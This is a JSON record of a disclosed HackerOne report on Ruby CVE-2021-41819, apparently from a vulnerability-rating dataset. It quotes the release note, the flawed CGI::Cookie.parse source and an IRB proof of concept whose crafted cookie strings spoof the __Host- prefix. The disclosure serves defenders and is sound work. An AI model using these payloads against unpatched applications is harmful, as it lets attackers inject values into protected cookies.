{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "ooooooo_q ",
  "title": "Ruby CVE-2021-41819: Cookie Prefix Spoofing in CGI::Cookie.parse",
  "content": "\nRelease note: https://www.ruby-lang.org/en/news/2021/11/24/cookie-prefix-spoofing-in-cgi-cookie-parse-cve-2021-41819/\nThe old versions of CGI::Cookie.parse applied URL decoding to cookie names. An attacker could exploit this vulnerability to spoof security prefixes in cookie names, which may be able to trick a vulnerable application.\nBy this fix, CGI::Cookie.parse no longer decodes cookie names. Note that this is an incompatibility if cookie names that you are using include non-alphanumeric characters that are URL-encoded.\nThis is the same issue of CVE-2020-8184.\n\nThe following is copied from hackerone's report. https://hackerone.com/reports/910552\nI found the same problem with https://hackerone.com/reports/895727 exists at CGI::Cookie.parse.\nhttps://github.com/ruby/ruby/blob/v2_7_1/lib/cgi/cookie.rb#L162\nCode 475 Bytes\n1def self.parse(raw_cookie)\n2  cookies = Hash.new([])\n3  return cookies unless raw_cookie\n4\n5  raw_cookie.split(/;\\s?/).each do |pairs|\n6    name, values = pairs.split('=',2)\n7    next unless name and values\n8    name = CGI.unescape(name)\n9    values ||= \"\"\n10    values = values.split('&').collect{|v| CGI.unescape(v,@@accept_charset) }\n11    if cookies.has_key?(name)\n12      values = cookies[name].value + values\n13    end\n14    cookies[name] = Cookie.new(name, *values)\n15  end\n16\n17  cookies\n18end\nThe value of name is decoded.\nPoC\nCode 546 Bytes\n1\u276f ruby -v\n2ruby 2.7.1p83 (2020-03-31 revision a0c7c23c9c) [x86_64-darwin19]\n3\n4\u276f irb\n5irb(main):001:0> require 'cgi'\n6=> true\n7\n8irb(main):002:0> cookie_a = CGI::Cookie.parse(\"__%48ost-evil=evil;__Host-evil=abc\")\n9irb(main):003:0> cookie_a[\"__Host-evil\"]\n10=> #<CGI::Cookie: \"__Host-evil=evil&abc; path=\">\n11irb(main):004:0> cookie_a[\"__Host-evil\"].to_a\n12=> [\"evil\", \"abc\"]\n13\n14irb(main):005:0> cookie_b = CGI::Cookie.parse(\"%48oge=evil;Hoge=abc;Foo=xxx\")\n15irb(main):006:0> cookie_b[\"Hoge\"].to_a\n16=> [\"evil\", \"abc\"]\n17irb(main):007:0> cookie_b[\"Foo\"].to_a\n18=> [\"xxx\"]\nImpact\nIt has the same impact as #895727, and it is possible to insert a value into the name of a cookie that should be protected by Cookie prefixes.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 2000,
  "weaknesses": [
    "Reliance on Cookies without Validation and Integrity Checking in a Security Decision"
  ],
  "screenshots": {},
  "disclosed_date": 1643877780,
  "report_url": "https://hackerone.com/reports/1464396",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Run Ruby 2.7.1 or earlier and require the CGI library in IRB"
    ],
    [
      2,
      "Execute CGI::Cookie.parse with a malicious cookie string containing URL-encoded characters in the cookie name (e.g., \"__%48ost-evil=evil;__Host-evil=abc\")"
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to spoof security prefixes in cookie names by exploiting URL decoding behavior in CGI::Cookie.parse. This could trick applications into processing malicious cookies that appear to have security prefixes like '__Host-' or '__Secure-'. The issue arises because the function incorrectly applies URL decoding to cookie names before processing them.",
  "reason": "The vulnerability requires understanding of cookie prefixes and URL encoding, but the attack itself is straightforward once these concepts are known. The interaction between URL decoding and cookie prefix validation is the subtle component, but the attack doesn't involve multiple complex components or state manipulation.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "895727"
}